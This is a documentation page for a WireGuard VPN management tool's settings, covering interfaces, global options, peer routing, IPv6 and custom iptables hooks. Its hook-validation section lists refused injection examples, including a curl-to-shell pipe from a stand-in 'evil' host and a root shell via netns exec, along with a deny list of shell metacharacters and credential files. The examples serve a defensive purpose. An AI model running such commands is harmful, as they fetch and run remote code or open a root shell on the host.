---
title: WireGuard Settings
---

# WireGuard Configuration

WireGuard settings are split between **Settings → General**, **Settings →
WireGuard**, and the top-level **Peers** page. The current release uses routed
WireGuard interfaces with NAT; it does not provide a bridge-mode setting.

## Server endpoint

Under **Settings → General**, set **Server FQDN / IP** to the public hostname or
IP address used by clients. Do not append a port. Each interface's **Listen
Port** supplies the UDP port in generated peer configurations.

## Global settings

Under **Settings → WireGuard → Global Settings**:

| Setting | Range/default | Effect |
|---|---|---|
| MTU | `1280`–`9000`, default `1420` | Written to generated configurations |
| Persistent Keepalive | `0`–`600`, recommended `25` | Helps peers behind NAT; `0` disables it |
| Use PresharedKey | optional | Adds the global PSK to newly generated peer configurations |

Regenerating the global preshared key requires downloading or scanning affected
client configurations again.

## Interfaces

Use **Settings → WireGuard → Interfaces** to create, start, stop, restart, edit,
or delete interfaces.

| Setting | Example | Notes |
|---|---|---|
| Name | `wg0` | Starts with a letter; up to 15 letters, digits, `_`, or `-` |
| IPv4 Address | `10.13.13.1/24` | Required server address and peer pool |
| IPv6 Address | `fd13:13:13::1/64` | Optional ULA prefix |
| Listen Port | `51820` | Unique UDP port from `1` to `65535` |
| DNS | `1.1.1.1,9.9.9.9` | Optional client fallback |
| Show on Dashboard | enabled | Controls dashboard gauges |

Subnets must not overlap another WireBuddy interface. A `/32` IPv4 or `/128`
IPv6 host address is rejected because it leaves no address pool for peers.

When no custom `PostUp`/`PostDown` hooks are supplied, WireBuddy detects the
host's default outbound interface and generates iptables rules for masquerading,
forwarding, and DNS access.

### Custom hook validation

Custom hooks are supported by the interface API, but `wg-quick` runs them
through a shell as root, so they are validated strictly before they are accepted
or written to a config file. A hook must satisfy **all** of the following:

- Every command starts with `iptables`, `ip6tables`, `ip`, `sysctl`, or `nft`.
- Commands are separated only by `;`.
- No shell metacharacters anywhere: `` ` ``, `$`, `\`, `|`, `&`, `<`, `>`,
  `(`, `)`, `{`, `}`, `[`, `]`, `!`, `*`, `?`, quotes, tabs, or newlines.
- No sub-commands that can launch another program: `netns exec`, `-f`,
  `--file`, `-c`, `--command`, `xargs`, `exec`, `eval`, `source`.
- No `..` path traversal and no references to `/etc/passwd` or `/etc/shadow`.

Rejected hooks return `422` with the offending command. Examples that are
**refused**, because a prefix check alone would let them through:

```text
ip link show && curl http://evil/x | sh
iptables -L | some-command
ip netns exec ns /bin/sh
nft -f /tmp/attacker-controlled
```

!!! warning
    A hook that passes validation still runs with the container's network
    privileges. Treat hook values as administrator-only, reviewed input.

Open the interface's UDP listen port in every upstream host, router, and cloud
firewall. The supplied container uses host networking, so Docker port publishing
is neither present nor required.

## Peer routing

The **Peers** form offers three client-side routing policies:

- **Recommended** uses `0.0.0.0/0, ::/0` for a full tunnel.
- **Local network access** uses split default routes so the client retains its
  directly connected LAN access.
- **Advanced** accepts explicit comma-separated CIDR ranges.

WireBuddy automatically allocates peer tunnel addresses. It can also inject its
interface address as DNS, apply selected blocklists, log DNS per device, and add
server-side client-isolation firewall rules.

## IPv6

Add a ULA prefix such as `fd13:13:13::1/64` to the interface to generate
dual-stack peers. Full-tunnel peers include `::/0`. IPv6 forwarding and working
upstream IPv6 connectivity are still host responsibilities. Leave the interface
IPv6 field empty if the host does not route IPv6.

## Traffic analysis

**Settings → WireGuard → Country Traffic Analysis** enables conntrack-based
destination aggregation. It requires `net.netfilter.nf_conntrack_acct=1`; see
[GeoIP & Maps](../features/geoip.md).

## Related API routes

Interface management is exposed under `/api/wireguard/interfaces`; peer
management is under `/api/wireguard/peers`. Exact methods and paths are listed
in [API Endpoints](../api/endpoints.md#wireguard).
